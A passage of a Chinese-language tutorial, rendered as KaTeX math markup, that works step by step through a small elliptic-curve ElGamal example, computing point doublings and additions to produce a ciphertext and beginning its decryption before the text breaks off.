class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span></p><p>这里舒服了哈哈，因为之前求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>3</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">3*(6,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>的过程中已经把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(6,4)+(6,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>算出来了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><mo>∗</mo><msub><mi>P</mi><mi>A</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mn>2</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_2=P_m+k*P_A=(5,4)+2*(7,12)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span></span></span></span></p><p>先求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(7,12)+(7,12)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span></span></span></span>，求得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><mo>∗</mo><mn>49</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>24</mn></mrow><annotation encoding="application/x-tex">\alpha=(3*49+1)/24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span><span class="mord">4</span></span></span></span>，这里就比较有趣了，因为24就是1，1的逆还是1，所以直接不用算了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">\alpha=10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mi>α</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mi>p</mi></msub><mo>−</mo><msub><mi>x</mi><mi>q</mi></msub><mo>=</mo><mn>100</mn><mo>−</mo><mn>14</mn><mo>=</mo><mn>86</mn><mo>=</mo><mn>17</mn></mrow><annotation encoding="application/x-tex">x_R=\alpha^2-x_p-x_q=100-14=86=17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">7</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mi>α</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>p</mi></msub><mo>−</mo><msub><mi>x</mi><mi>R</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>p</mi></msub><mo>=</mo><mn>10</mn><mo>∗</mo><mo stretchy="false">(</mo><mo>−</mo><mn>10</mn><mo stretchy="false">)</mo><mo>−</mo><mn>12</mn><mo>=</mo><mn>158</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">y_R=\alpha(x_p-x_R)-y_p=10*(-10)-12=158=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>。</p><p>故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(7,12)+(7,12)=(17,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>。</p><p>再求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(17,3)+(5,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span></p><p>先求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>21</mn></mrow><annotation encoding="application/x-tex">\alpha=21</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><mn>2</mn><msup><mn>1</mn><mn>2</mn></msup><mo>−</mo><mn>17</mn><mo>−</mo><mn>5</mn><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">x_R=21^2-17-5=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>21</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>17</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo>−</mo><mn>3</mn><mo>=</mo><mn>19</mn></mrow><annotation encoding="application/x-tex">y_R=21*(17-5)-3=19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span></span></span></span>。</p><p>得最后得结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(5,19)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span></span></span></span></p><p>所以我们加密的结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((13,7),(5,19))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>。</p><p>现在还是解密<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>C</mi><mn>2</mn></msub><mo>−</mo><mi>a</mi><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo>−</mo><mn>3</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=C_2-aC_1=(5,19)-3*(13,7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 